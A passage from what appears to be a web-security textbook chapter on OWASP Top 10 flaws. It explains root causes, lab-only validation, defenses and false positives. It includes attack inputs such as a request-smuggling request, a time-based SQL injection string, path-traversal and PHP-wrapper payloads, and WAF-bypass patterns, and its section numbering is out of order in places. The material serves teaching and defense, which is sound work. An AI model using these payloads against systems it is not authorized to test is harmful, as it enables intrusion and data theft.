
### 9.25.2 Cryptographic failures

Root cause: sensitive data is stored or transmitted without appropriate confidentiality/integrity. Examples: plaintext passwords/PII, weak hashes (MD5/SHA1), reversible encryption with keys in source, weak randomness for tokens, missing TLS, predictable JWT secrets. Lab validation: show data crossing the network in cleartext (on a lab host you own), or that a stored value reverses with a known key, or that two identical passwords produce identical hashes (no salt). Impact: credential compromise and identity theft. Defense: TLS 1.2+, AES-GCM/ChaCha20 at rest with managed keys, Argon2id/bcrypt for passwords, CSPRNG for all secrets, and no secrets in source or logs. Verify with a scan of config, a DB dump (salted slow hashes), and a TLS configuration check. False positive: data is tokenized or encrypted with a managed KMS and never exposed in plaintext to the app.

## 9.26 Mastery Deep Dive: A02 Misconfiguration, A03 Supply Chain, A08 Integrity

### 9.26.1 A02 Security misconfiguration

Root cause: insecure defaults or incomplete configuration. Signals: directory listing, default credentials, exposed admin/debug consoles (`/actuator`, `/phpmyadmin`, GraphQL Playground in production), verbose errors/stack traces, missing security headers, unnecessary open ports, permissive CORS, public cloud storage, and XML processors with entities enabled. Lab detection: enumerate common paths, read response headers, trigger errors, and scan with a config checker on your own assets. Defense: hardened baselines, infrastructure-as-code, automated config scanning in CI, least functionality, and removing default accounts. Verify by re-running the enumeration and confirming endpoints are absent or protected and headers are present.

### 9.26.2 A03 Software supply chain failures

Root cause: trusting third-party code or build/deploy systems without verification. Includes known-vulnerable dependencies, typosquatting, dependency confusion (public package shadows private), compromised maintainers, and tampered build artifacts. Detection: generate an SBOM, scan dependencies (SCA tools), verify lockfiles and integrity hashes, and check CI/CD permissions and artifact signing. Defense: pin dependencies, verify signatures, private registries with scoped names, protected branches, signed builds, and minimal CI secrets. Verify that a dependency with a known CVE cannot reach production and that builds are reproducible.

### 9.26.3 A08 Software and data integrity failures

Root cause: deserializing untrusted objects or accepting unverified updates/data. Recognize native serialization formats: Java `rO0AB` (base64 `AC ED`), PHP `O:`/`a:`, Python `pickle` (`\x80`), .NET `AAEAAAD//`. Lab-safe validation: use a gadget that creates a harmless marker file (`touch /tmp/lab-proof`) in an isolated lab; observe the effect. Defense: never deserialize untrusted data; use data-only JSON with strict schemas; if unavoidable, sign/encrypt blobs and apply deserialization filters (JEP 290). Also cover unsigned auto-updates and webhooks without HMAC signatures — verify by tampering with a lab update payload and confirming rejection.

## 9.27 Mastery Deep Dive: A06 Insecure Design, A09 Logging, A10 Exceptional Conditions

### 9.27.1 A06 Insecure design

Root cause: missing or ineffective controls *by design* — the correct implementation of the wrong workflow. Business-logic flaws live here: negative quantities producing credits, trusting client-side prices, coupon reuse, skipping workflow steps, and workflows that can be reordered. Lab detection: map multi-step flows and ask "what if I skip, repeat, reorder, or negate this step?" Test with your own accounts and harmless values. Defense: threat modeling during design, server-enforced invariants and authoritative pricing, abuse-case tests, and state machines that validate transitions. Verify by attempting the abused flow and confirming rejection.

### 9.27.2 A09 Security logging and alerting failures

Root cause: attacks are not detected or recorded. Without logs, breaches persist and forensics fail. Detection: in a lab, perform a recognizable attack (failed logins, IDOR probes) and check whether it appears in application, proxy, and SIEM logs with sufficient context (who, what, when, source IP, outcome) and whether an alert fires. Defense: comprehensive structured audit logs, tamper-resistant centralized storage, alerting on thresholds and anomalies, and tested incident response. Verify that logs are complete, correlate across tiers, and that an alert is actually generated. Never log secrets or raw sensitive payloads.

### 9.27.3 A10 Mishandling of exceptional conditions

Root cause: unsafe behavior on error and edge paths — null dereferences, unhandled exceptions that leak internals, fail-open authorization, numeric overflow/underflow, and race conditions. Detection: fuzz with nulls, huge/negative numbers, unexpected types, and malformed encodings; observe 500s, stack traces, inconsistent states, or fail-open behavior (e.g., a policy lookup that throws and then permits). Defense: explicit error handling, generic error responses, fail-closed defaults, input bounds, and comprehensive edge-case tests. Verify by replaying each malformed input and confirming a clean, generic rejection with no state change.

## 9.28 Mastery Deep Dive: XSS, CSRF, SSRF, Smuggling, and Cache Poisoning

These classes are folded into the 2025 categories (XSS into A05, SSRF into A01) but deserve standalone mastery.

### 9.28.1 XSS — contexts and verification

Root cause: untrusted data is rendered without context-appropriate encoding. Three types: reflected, stored, DOM. The encoding must match the sink: HTML body → entity-encode; attribute → quote-encode; JavaScript string → JS-escape; URL → percent-encode; CSS → CSS-escape. Lab-safe proof: `alert(document.domain)` in your own account. For rich text, sanitize with DOMPurify (not regex). Combine with `HttpOnly` cookies and a nonce-based CSP. Verify by replaying the payload and confirming it renders as text and that CSP blocks any stray script. False positives: reflected but encoded, blocked by CSP, or executed only in a sandboxed different origin.

### 9.28.2 CSRF — mechanics and verification

Root cause: state-changing requests rely on ambient cookies without an unforgeable token. Lab PoC: a local HTML page auto-submits a form to `<LAB_HOST>` that changes the lab user's email. Defenses: synchronizer tokens, `SameSite=Lax/Strict`, `Origin`/`Referer` validation, and re-authentication for sensitive actions. Verify by replaying the PoC after token enforcement — the request must fail with the token missing/invalid. False positive: endpoints requiring a custom header or JSON body that cannot be sent cross-origin without CORS.

### 9.28.3 SSRF — mechanics and verification

Root cause: the server fetches a client-chosen destination without restriction. Lab-safe proof: point the URL parameter at a listener you control and at `http://127.0.0.1:<port>/` on your own lab host; observe the callback. Bypasses studied in labs: decimal/octal IP formats, IPv6-mapped addresses, DNS rebinding, `@` in URLs (`http://allowed@127.0.0.1/`), open redirects, and alternative schemes. Defense: strict scheme/host/port allow-lists, resolve-and-pin IPs, block private/link-local ranges (IPv4 and IPv6), disable redirects or re-validate each hop, and enforce egress firewalling. Verify that each bypass payload is rejected or cannot reach internal space.

### 9.28.4 Request smuggling and cache poisoning

**Smuggling (CWE-444):** front-end and back-end disagree on request boundaries. With both `Content-Length` and `Transfer-Encoding` present, an RFC-compliant front-end uses TE and ignores CL, while a back-end that uses CL will leave a prefix that becomes the next request. Only test in dedicated labs (e.g., PortSwigger's). Defense: normalize/deduplicate framing headers, reject requests containing both, and use HTTP/2 end-to-end.

```http
POST / HTTP/1.1
Host: <LAB_HOST>
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

**Cache poisoning:** an attacker-controlled, unkeyed input (e.g., `X-Forwarded-Host`) is reflected into a response that the cache then serves to others. Detect in a lab by poisoning a header on one request and retrieving a normal request's cached response to see the value. Defense: include influential inputs in the cache key, strip untrusted headers at the edge, avoid reflecting headers, and set `Cache-Control: private/no-store` on personalized responses. Verify that poisoning no longer propagates to a second request.

## 9.29 Mastery Deep Dive: Detection, Verification, and False-Positive Discipline

A rigorous loop separates researchers from alert fatigue:

```
Signal -> Hypothesis -> Minimal safe test (lab/own account) -> Record exact bytes
  -> Confirm or refute -> Consider false positives -> Assess with test data
  -> Map to CWE -> Report with reproduction and remediation
```

False-positive discipline: a quote causing a generic 500 is not proof of SQLi; a reflected `<script>` that is entity-encoded is not XSS; a 200 on an "IDOR" that returns the same object (scoped to session) is not a finding; a missing header may be handled by an upstream proxy. Always seek the *strongest* evidence: a timing difference with a controlled sentinel, a callback to a lab listener, or a cross-account state change with your own accounts. Record exact request/response pairs, DBMS/error strings, and the data exposed. Map to CWE (e.g., 89 SQLi, 79 XSS, 639 IDOR, 918 SSRF, 502 deserialization, 444 smuggling). Report prerequisite conditions honestly (auth level, user interaction, scope). Verification is a two-way street: after a fix, replay the identical payload and prove it now fails.

### 9.30.2 Common mistakes

- Stopping at detection (a reflected marker) without demonstrating impact with test data.
- Mislabeling a fail-open or generic error as a finding without verifying the underlying behavior.
- Ignoring the 2025 edition's category changes when reporting (SSRF under A01, XSS under A05, new A10).
- Reporting a "missing security header" without showing the exploitable consequence.

### 9.30.3 Knowledge checks (answers below)

1. A sequential ID returns different data for each value with your second account's token. Which category and CWE?
2. A payload `' AND SLEEP(5)-- ` produces a 5-second delay. Which SQLi class is this, and why is a delay sufficient proof in a lab?
3. A response reflects `X-Forwarded-Host` into a script URL, and the cache key excludes that header. Name the flaw and the fix.
4. Why is a reflected `<script>` that appears as `&lt;script&gt;` in the page source usually a false positive?
5. A Java cookie starts with `rO0AB`. What should you investigate, and what is the primary defense?

**Answers.** (1) A01 Broken Access Control — BOLA/IDOR, CWE-639. (2) Time-based blind SQLi; the conditional delay proves attacker-controlled SQL evaluation without needing data extraction. (3) Cache poisoning; include the header in the key or strip it at the edge and avoid reflecting it. (4) It was entity-encoded, so the browser treats it as text, not markup. (5) Java serialized-object deserialization (A08, CWE-502); primary defense is to never deserialize untrusted data (or to sign/encrypt and filter if unavoidable).

2. On OWASP Juice Shop, find and document one finding per OWASP category using only your own account.
3. Build a local XXE target and demonstrate both in-band file read (of a marker file you created) and blind OOB callback to a listener you control.
4. In a lab cache setup, poison a response via an unkeyed header and verify your fix stops propagation.
5. Replay every payload from this chapter against a patched lab build and confirm each is neutralized.

## 9.31 Mastery Deep Dive: A01 Deep — IDOR Variants and Multi-Tenant BOLA

### 9.31.1 Beyond numeric IDs

Object references come in many forms, and each needs its own test approach:

| Reference form | Example | Test approach (own accounts only) |
|----------------|---------|-----------------------------------|
| Sequential integer | `/orders/1042` | Increment/decrement; compare bodies |
| UUID | `/doc/9f2c...` | Use IDs captured from your second account |
| Hash / slug | `/u/bob-hash` | Use your other account's slug |
| Filename | `/invoices/2024/inv-88.pdf` | Predict or capture names |
| Body/query field | `{"account":"A1"}` | Swap to B's value |
| Header | `X-User-Id: 1042` | Replace with B's ID |

A reference may be *blind*: the response does not contain data but a side effect occurs (an email is sent, a file is generated). Detect those via callbacks to a listener you control or by observing queued jobs in a lab.

### 9.31.2 GraphQL and bulk BOLA

GraphQL resolvers are a common BOLA surface: a `user(id:)` resolver that queries by ID alone, or a `users` list that ignores the authenticated principal. Test each resolver with two accounts; inspect every returned field, not just what the UI uses. Bulk endpoints are higher impact because one request can expose many objects: `/export?ids=1,2,3`, `/api/orders?user_id=B`. Hide a single unauthorized ID among authorized ones — validators often check only the first. Defense: authorize every object in a batch individually and filter at the data layer.

### 9.31.3 Multi-tenant isolation failures

In SaaS, the tenant ID must be derived from the authenticated context, never accepted from the client. Failures appear in: a query missing the tenant filter, a cache keyed only by object ID, object-storage prefixes using predictable tenant names, search indices shared across tenants, and async jobs trusting a tenant ID in the message payload. Test with two of your own tenants: capture a request from tenant A and replace the tenant/object identifiers with tenant B's (obtained from B's account). Verify that a fix scopes every access path — database, cache, files, search, jobs — to the authenticated tenant. Common mistake: assuming a UUID or per-tenant subdomain is a control.

## 9.32 Mastery Deep Dive: A05 Deep — Advanced Injection

### 9.32.1 Second-order and stacked injection

Second-order injection stores a payload that is only interpreted when retrieved elsewhere (see Chapter 7). Stacked queries (`; INSERT INTO lab...`) depend on the driver allowing multiple statements — many do not, but some ORMs and admin features do. In a lab, test with a harmless insert into a table you created. WAF bypass patterns to study in labs (never on third parties): case variation, comment insertion (`UN/**/ION`), inline comments, alternate whitespace/newlines, encoding, and parameter pollution. Each bypass should be paired with an understanding of *which* normalization step failed.

### 9.32.2 Other injection families

- **LDAP injection:** filter strings built by concatenation (`(uid=<input>)`); lab payload `*` or `)(&` can broaden results or bypass auth. Fix by escaping LDAP special characters.
- **XPath/XQuery injection:** string-built XPath expressions; lab payloads inject `' or '1'='1` style conditions. Fix with parameterized XPath variables.
- **Expression Language (EL/SpEL/OGNL) injection:** user data evaluated as an expression (`${input}`); can lead to RCE in some frameworks. Fix by never evaluating user input as expressions.
- **Header/SMTP injection:** CRLF (`%0d%0a`) in headers or email fields lets an attacker add headers or recipients. Fix by rejecting CR/LF and using mail-library APIs.

### 9.32.3 Detection and verification rigor

For each injection family, the evidentiary standard is the same: a controlled input changes the meaning of an interpreter in a way that produces a measurable, attributable effect — an extra row, a conditional delay, a callback, or a broadened filter — using only sentinels and lab data. After remediation, replay the identical payloads and confirm the effect disappears. False positives to reject: errors that are generic, payloads reflected as text, and WAF-generated blocks that mask whether the underlying code is still vulnerable.

## 9.33 Mastery Deep Dive: A02/A04/A08 Deep — Configuration and Crypto Failures

### 9.33.1 A systematic misconfiguration inventory

Build a checklist and apply it to every lab host: default credentials; exposed admin/debug endpoints; directory listing; verbose errors and stack traces; HTTP methods allowed; TLS version/cipher suite and certificate; security headers (`CSP`, `HSTS`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`); `Server`/`X-Powered-By` banners; CORS and `Access-Control-Allow-Origin`; cloud storage permissions; and XML parser entity settings. Each gap should be tied to an exploit path in your lab, not just reported as a missing header.

### 9.33.2 Cryptographic implementation failures

Beyond weak algorithms, look for: predictable tokens (linear PRNGs, timestamps, `Math.random()`), insufficient length (<128-bit secrets), ECB mode (identical plaintext blocks reveal patterns), IV reuse in CBC, missing authentication on ciphertext (padding-oracle attacks — study in a lab), keys in source or environment exposed via debug endpoints, and deprecated hashes for signatures. Lab validation: collect several tokens and check for patterns or collisions; test whether modifying ciphertext causes distinguishable errors. Defense: use vetted libraries and modes (AES-GCM, ChaCha20-Poly1305), CSPRNGs with adequate entropy, managed keys, and authenticated encryption. Verify by confirming tokens are unpredictable and tampering yields generic errors.

### 9.33.3 Integrity failures in pipelines

Supply-chain and integrity failures extend beyond deserialization: unsigned artifacts, unlocked CI/CD with write access from pull requests, build scripts that fetch dependencies over HTTP, containers with mutable tags, and webhooks accepted without HMAC signatures. Lab exercise: create a toy CI pipeline, then show how an unpinned dependency or untrusted webhook can inject a change; then add pinning, signing, and signature verification and show the change is rejected. Defense: SBOMs, signed builds, pinned dependencies, protected branches, and verified webhook signatures with timestamps.

## 9.34 Mastery Deep Dive: A06/A09/A10 Deep — Logic Abuse and Detection Engineering

### 9.34.1 Business logic abuse patterns

Catalog recurring logic flaws and the "what-if" question for each:

| Pattern | Question to ask in a lab |
|---------|--------------------------|
| Client-side pricing | Can I change the price/quantity in the request? |
| Workflow skipping | Can I jump to the final step without paying? |
| Negative values | Does `qty=-1` produce a credit? |
| Replay | Can I reuse a one-time token or coupon? |
| Reordering | Does the app assume steps happen in order? |
| Trust in references | Can I reference another user's cart/session? |
| Excessive automation | Can a legitimate flow be scaled (scalping, spam)? |

Defense: enforce invariants server-side, model flows as state machines with validated transitions, use authoritative values, and design abuse cases during threat modeling. Verify by replaying each abuse and confirming rejection.

### 9.34.2 Detection engineering

Effective logging records, for each security-relevant event: authenticated principal, source IP, timestamp, action, target object, outcome, and a correlation ID. Centralize logs in a tamper-resistant SIEM; alert on patterns such as repeated failed logins, high rates of 403/404, object-ID enumeration (sequential access), and atypical data egress. Detection content should be tested: in a lab, generate each pattern and confirm an alert fires within the expected window. Avoid logging secrets or raw sensitive payloads; use structured formats for queryability. Common mistake: logging only successes, which hides credential attacks.

### 9.34.3 Exceptional conditions and fail-open design

Fail-open is the most dangerous error path: a policy service times out and the app permits the action; a parser throws and validation is skipped; a null value bypasses a check. Lab tests: make a dependent service unavailable (in a lab) and observe whether the app denies; send nulls and extreme values to each parameter and observe behavior; trigger exceptions and check that responses are generic and state is unchanged. Defense: fail-closed defaults, explicit error handling, input bounds, and comprehensive edge-case tests. Verify by replaying each edge case and confirming a clean denial with no state change.

## 9.35 Mastery Deep Dive: File Upload, Path Traversal, XXE, and Redirects

### 9.35.1 File upload to RCE — full chain in a lab

Root cause: the server trusts client-supplied filenames/content types, stores uploads under the web root with execution enabled, or processes them with unsafe parsers. Lab-safe methodology:

1. Map the upload surface: endpoint, allowed extensions, size limits, where files are stored, and how they are served (same origin? `Content-Disposition`?).
2. Test validation layers independently: extension blacklists/allowlists, magic-byte checks, MIME checks, filename sanitization, and image re-encoding. Try double extensions (`shell.png.php`), null bytes, case variation, and polyglots.
3. Test *processing*, not just storage: image libraries (ImageMagick/PIL), PDF generators, and archive extraction (Zip Slip: entries with `../` paths) are common RCE/XXE vectors.
4. Prove impact harmlessly: upload a marker file whose content is a known string and demonstrate execution only in an isolated lab app (e.g., a script that prints `LAB_MARKER`).

Defense: allow-list extensions, verify magic bytes, rename files to random IDs, store outside the web root with no execute permission, serve from a separate origin/CDN, re-encode images, scan files, and cap sizes. Verify by replaying each bypass and confirming the file is rejected, renamed, or served inertly.

### 9.35.2 Path traversal and LFI/RFI

Root cause: user input is concatenated into a filesystem path and the app fails to canonicalize and constrain it. Lab patterns: `../` sequences with URL encoding (`%2e%2e%2f`), double encoding, absolute paths, and PHP wrappers (`php://filter/convert.base64-encode/resource=...`, `data://`). LFI escalates to RCE through log poisoning (inject PHP into a log file, then include it) or via `/proc/self/environ` in old setups; RFI requires remote includes enabled. Detection: submit traversal sequences and observe whether a known marker file you created in the lab is returned. Defense: map user input to fixed identifiers, canonicalize paths and confirm they remain under a base directory, disable dangerous wrappers and remote includes, and run the process with least privilege. Verify that each payload resolves inside the allowed base or is rejected.

### 9.35.3 XXE beyond the basics

XXE (CWE-611) variants: in-band entity read (file contents reflected), blind OOB (external parameter entity to a listener you control), error-based, and denial of service (billion-laughs entity expansion). Modern wrappers include XInclude and SOAP/SAML processing, and file formats that embed XML (DOCX, XLSX, SVG). Lab validation: read a marker file you created; for blind cases, confirm a callback to your listener. Defense: disable DTD processing and external entities in every XML parser, prefer JSON, use hardened parsers, and patch libraries. Verify that entity declarations are ignored or rejected. False positive: the parser does not process DTDs, or error messages contain no file content and no callback occurs.

### 9.35.4 Open redirects and chaining

Root cause: an application accepts an unvalidated URL for a redirect. Lab validation: set `?next=https://lab-marker.<LAB_HOST>` and confirm the redirect target. Impact is often *chained*: open redirect → OAuth `redirect_uri` abuse → token leakage; open redirect → phishing on a trusted domain; open redirect → SSRF when a fetch follows the redirect. Defense: allow-list relative paths or a fixed set of trusted destinations; resolve and compare origins; avoid accepting full URLs. Verify by replaying absolute and protocol-relative (`//evil`) targets and confirming rejection. Common mistake: checking that the URL merely "starts with" the trusted host (`https://trusted.com.evil.com`).

## 9.36 Mastery Deep Dive: Subdomain Takeover and Asset Recon

Root cause: a DNS record (usually a CNAME) points to an external service whose resource has been deprovisioned, leaving the name unclaimed. An attacker who claims that resource serves content on the organization's subdomain. Detection: enumerate subdomains of an authorized scope (passive sources such as Certificate Transparency, DNS, and JS bundles), inspect CNAME targets, and look for telltale unclaimed responses (`NoSuchBucket`, `404 Repository not found`, "No such app"). Verification must respect the program's rules: prove the service is claimable (e.g., the bucket name is available) without hosting malicious content or claiming production infrastructure. Impact: phishing on a trusted domain, cookie-based session capture when cookies are scoped to the parent domain, and brand damage. Defense: inventory external dependencies, remove dangling DNS records during deprovisioning, claim or delete resources before DNS cleanup, and monitor for new dangling records. Verify by re-checking every known CNAME and confirming each resolves to a claimed, controlled resource. False positive: the service is claimed by the organization, the record is intentionally parked, or the response is a generic error with no ownership signal.

## 9.21 Key Takeaways

- The current web Top 10 is the 2025 edition; SSRF moved under A01, supply chain expanded, and A10 is new.
- Every vulnerability has a root cause in a violated trust boundary or confused data/code distinction.
- Safe validation uses only your own accounts and labs; demonstrate impact with controlled markers.
- A consistent 14-point analysis makes your testing and reporting rigorous.
